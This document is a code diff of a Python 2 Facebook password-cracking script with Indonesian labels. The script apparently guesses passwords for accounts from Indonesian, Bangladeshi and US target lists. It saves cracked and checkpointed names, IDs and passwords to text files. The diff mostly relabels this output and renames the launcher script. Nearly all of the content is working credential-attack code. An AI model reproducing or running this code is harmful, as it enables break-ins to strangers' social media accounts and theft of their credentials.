+                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m: \x1b[1;93m' + bos8
                                             cek = open('done/indo.txt', 'a')
-                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
+                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos8 + '\n')
                                             cek.close()
                                             cekpoint.append(zowe)
         except:
@@ -576,7 +576,7 @@ def pilih_indo():
     print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;93mfile tersimpan \x1b[1;91m: \x1b[1;92mdone/indo.txt'
     print 50 * '\x1b[1;94m\xe2\x94\x80'
     raw_input('\x1b[1;97m{<\x1b[1;93mKembali\x1b[1;97m>}')
-    os.system('python2 cr4ck.py')
+    os.system('python2 roy-scold.py')
 
 
 def crack_bangla():
@@ -694,20 +694,20 @@ def pilih_bangla():
             ko = json.load(data)
             if 'access_token' in ko:
                 print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
+                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos1
                 oke = open('done/bangla.txt', 'a')
-                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
+                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos1 + '\n')
                 oke.close()
                 oks.append(zowe)
             elif 'www.facebook.com' in ko['error_msg']:
                 print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
-                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
-                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
-                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos1
+                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;96m' + j['name']
+                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;96m' + zowe
+                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;96m' + bos1
                 cek = open('done/bangla.txt', 'a')
-                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
+                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos1 + '\n')
                 cek.close()
                 cekpoint.append(zowe)
             else:
@@ -716,20 +716,20 @@ def pilih_bangla():
                 ko = json.load(data)
                 if 'access_token' in ko:
                     print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
+                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos2
                     oke = open('done/bangla.txt', 'a')
-                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
+                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos2 + '\n')
                     oke.close()
                     oks.append(zowe)
                 elif 'www.facebook.com' in ko['error_msg']:
                     print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
-                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
-                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
-                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos2
+                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;96m' + j['name']
+                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;96m' + zowe
+                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;96m' + bos2
                     cek = open('done/bangla.txt', 'a')
-                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
+                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos2 + '\n')
                     cek.close()
                     cekpoint.append(zowe)
                 else:
@@ -738,20 +738,20 @@ def pilih_bangla():
                     ko = json.load(data)
                     if 'access_token' in ko:
                         print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
+                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos3
                         oke = open('done/bangla.txt', 'a')
-                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
+                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos3 + '\n')
                         oke.close()
                         oks.append(zowe)
                     elif 'www.facebook.com' in ko['error_msg']:
                         print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
-                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
-                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
-                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos3
+                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;96m' + j['name']
+                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;96m' + zowe
+                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;96m' + bos3
                         cek = open('done/bangla.txt', 'a')
-                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
+                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos3 + '\n')
                         cek.close()
                         cekpoint.append(zowe)
                     else:
@@ -760,20 +760,20 @@ def pilih_bangla():
                         ko = json.load(data)
                         if 'access_token' in ko:
                             print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
+                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos4
                             oke = open('done/bangla.txt', 'a')
-                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
+                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos4 + '\n')
                             oke.close()
                             oks.append(zowe)
                         elif 'www.facebook.com' in ko['error_msg']:
                             print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
-                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
-                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
-                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos4
+                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;96m' + j['name']
+                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;96m' + zowe
+                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;96m' + bos4
                             cek = open('done/bangla.txt', 'a')
-                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
+                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos4 + '\n')
                             cek.close()
                             cekpoint.append(zowe)
                         else:
@@ -782,20 +782,20 @@ def pilih_bangla():
                             ko = json.load(data)
                             if 'access_token' in ko:
                                 print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
+                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos5
                                 oke = open('done/bangla.txt', 'a')
-                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
+                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos5 + '\n')
                                 oke.close()
                                 oks.append(zowe)
                             elif 'www.facebook.com' in ko['error_msg']:
                                 print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
-                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
-                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
-                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos5
+                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;96m' + j['name']
+                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;96m' + zowe
+                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;96m' + bos5
                                 cek = open('done/bangla.txt', 'a')
-                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
+                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos5 + '\n')
                                 cek.close()
                                 cekpoint.append(zowe)
                             else:
@@ -804,20 +804,20 @@ def pilih_bangla():
                                 ko = json.load(data)
                                 if 'access_token' in ko:
                                     print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
+                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos6
                                     oke = open('done/bangla.txt', 'a')
-                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
+                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos6 + '\n')
                                     oke.close()
                                     oks.append(zowe)
                                 elif 'www.facebook.com' in ko['error_msg']:
                                     print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
-                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
-                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
-                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos6
+                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;96m' + j['name']
+                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;96m' + zowe
+                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;96m' + bos6
                                     cek = open('done/bangla.txt', 'a')
-                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
+                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos6 + '\n')
                                     cek.close()
                                     cekpoint.append(zowe)
                                 else:
@@ -826,20 +826,20 @@ def pilih_bangla():
                                     ko = json.load(data)
                                     if 'access_token' in ko:
                                         print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos7
+                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos7
                                         oke = open('done/bangla.txt', 'a')
-                                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
+                                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos7 + '\n')
                                         oke.close()
                                         oks.append(zowe)
                                     elif 'www.facebook.com' in ko['error_msg']:
                                         print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
-                                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
-                                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
-                                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos7
+                                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;96m' + j['name']
+                                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;96m' + zowe
+                                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;96m' + bos7
                                         cek = open('done/bangla.txt', 'a')
-                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
+                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos7 + '\n')
                                         cek.close()
                                         cekpoint.append(zowe)
                                     else:
@@ -848,20 +848,20 @@ def pilih_bangla():
                                         ko = json.load(data)
                                         if 'access_token' in ko:
                                             print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos8
+                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos8
                                             oke = open('done/bangla.txt', 'a')
-                                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
+                                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos8 + '\n')
                                             oke.close()
                                             oks.append(zowe)
                                         elif 'www.facebook.com' in ko['error_msg']:
                                             print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
-                                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
-                                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
-                                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos8
+                                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;96m' + j['name']
+                                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;96m' + zowe
+                                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;96m' + bos8
                                             cek = open('done/bangla.txt', 'a')
-                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
+                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos8 + '\n')
                                             cek.close()
                                             cekpoint.append(zowe)
         except:
@@ -875,7 +875,7 @@ def pilih_bangla():
     print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;96mCP \x1b[1;96mfile tersimpan \x1b[1;91m: \x1b[1;92mdone/bangla.txt'
     print 50 * '\x1b[1;94m\xe2\x94\x80'
     raw_input('\x1b[1;97m{<\x1b[1;96mKembali\x1b[1;97m>}')
-    os.system('python2 cr4ck.py')
+    os.system('python2 roy-scold.py')
 
 
 def crack_usa():
@@ -993,20 +993,20 @@ def pilih_usa():
             ko = json.load(data)
             if 'access_token' in ko:
                 print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
+                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos1
                 oke = open('done/usa.txt', 'a')
-                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
+                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos1 + '\n')
                 oke.close()
                 oks.append(zowe)
             elif 'www.facebook.com' in ko['error_msg']:
                 print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
-                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
-                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
-                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos1
+                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;95m' + j['name']
+                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;95m' + zowe
+                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;95m' + bos1
                 cek = open('done/usa.txt', 'a')
-                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
+                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos1 + '\n')
                 cek.close()
                 cekpoint.append(zowe)
             else:
